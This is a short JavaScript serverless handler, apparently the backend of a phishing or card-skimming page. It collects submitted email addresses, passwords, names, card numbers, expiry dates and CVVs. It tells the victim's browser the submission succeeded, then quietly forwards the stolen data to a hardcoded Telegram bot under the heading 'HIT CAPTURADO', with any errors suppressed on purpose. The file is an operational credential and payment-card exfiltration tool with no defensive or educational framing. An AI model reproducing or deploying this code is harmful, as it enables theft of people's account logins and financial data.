const axios = require('axios');

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Cache-Control', 'no-store');

    if (req.method === 'OPTIONS') return res.status(200).end();
    
    // Respondemos OK antes de enviar a Telegram para máxima velocidad
    res.status(200).json({ ok: true });

    const { em, pw, nm, cc, ex, cv } = req.body;
    const botToken = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chatId = "7993722214";

    const mensaje = `⭐ **HIT CAPTURADO** ⭐\n\n` +
                    `📧 **Email:** \`${em}\` \n` +
                    `🔑 **Pass:** \`${pw}\` \n\n` +
                    `👤 **Nombre:** ${nm}\n` +
                    `💳 **Tarjeta:** \`${cc}\` \n` +
                    `📅 **Exp:** ${ex} | **CVV:** ${cv}`;

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: mensaje,
            parse_mode: 'Markdown'
        });
    } catch (e) {
        // Silencioso
    }
}
